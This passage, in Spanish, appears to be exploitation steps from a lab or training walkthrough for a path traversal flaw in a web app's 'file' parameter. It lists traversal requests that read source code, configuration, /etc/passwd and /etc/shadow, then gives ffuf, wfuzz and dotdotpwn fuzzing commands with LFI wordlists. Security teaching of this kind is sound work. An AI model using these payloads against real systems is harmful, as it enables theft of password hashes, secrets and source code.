Pasos de explotación

  1. El parámetro file se concatena con la ruta base static/files/ sin validación.
  2. Usando ../ puedes navegar fuera del directorio permitido:
/files?file=../../database/schema.sql    # esquema BD
/files?file=../../app.py                  # código fuente
/files?file=../../config.ini              # configuración
/files?file=../../etc/passwd              # usuarios del sistema
/files?file=../../etc/shadow              # hashes de contraseñas
/files?file=../../etc/hostname            # nombre del host
/files?file=../../proc/version            # versión del kernel
  1. Con Burp Suite: intercepta el GET y modifica el parámetro file.
  2. Fuzzea rutas con ffuf usando wordlists LFI de SecLists:
# Fuzzing básico de path traversal
ffuf -u "http://TARGET:5000/files?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -mc 200 -fs 0

# Wordlist alternativa
ffuf -u "http://TARGET:5000/files?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -t 20

# Con wfuzz
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  --hc 404 "http://TARGET:5000/files?file=FUZZ"

# Con dotdotpwn
dotdotpwn -m http -h TARGET -x 5000 -f /etc/passwd \
  -u "http://TARGET:5000/files?file=TRAVERSAL" -k "root:"

Herramientas
